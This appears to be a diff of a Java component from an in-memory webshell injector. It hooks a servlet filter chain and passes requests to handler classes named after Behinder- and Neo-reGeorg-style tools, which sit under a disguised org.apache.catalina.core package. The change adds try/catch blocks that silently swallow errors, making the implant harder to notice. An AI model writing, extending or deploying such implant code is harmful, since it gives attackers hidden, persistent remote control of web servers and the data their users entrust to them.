@@ -5,9 +5,10 @@ import indi.augusttheodor.Options;
 import java.util.HashMap;
 import java.util.Map;
 
-public abstract class ServletFilterChainStage implements Stage { //基于Servlet的Stage
+public abstract class ServletFilterChainStage implements Stage {
 
     protected abstract String getClassName();
+
     protected abstract String getMethodName();
 
     @Override
@@ -29,12 +30,15 @@ public abstract class ServletFilterChainStage implements Stage { //基于Servlet
     @Override
     public String getInjectedSource(String className, String methodName, Options options) {
         return "{" +
-                "java.util.Map s=indi.augusttheodor.stage.ServletCompat.handle($1,$2);" +
-                "if(s!=null){" +
-                "   org.apache.catalina.core.RebeyondServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
-                "   org.apache.catalina.core.ExtendServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
-                "   org.apache.catalina.core.NeoServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
-                "   }" +
+                "try{" +
+                "java.util.Map _ag=indi.augusttheodor.stage.ServletCompat.handle($1,$2);" +
+                "if(_ag!=null){" +
+                "java.util.Map _rd=indi.augusttheodor.stage.ServletCompat.getRdd(_ag);" +
+                "try{org.apache.catalina.core.RebeyondServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
+                "try{org.apache.catalina.core.ExtendServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
+                "try{org.apache.catalina.core.NeoServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
+                "}" +
+                "}catch(Throwable _t){}" +
                 "}";
     }
 }
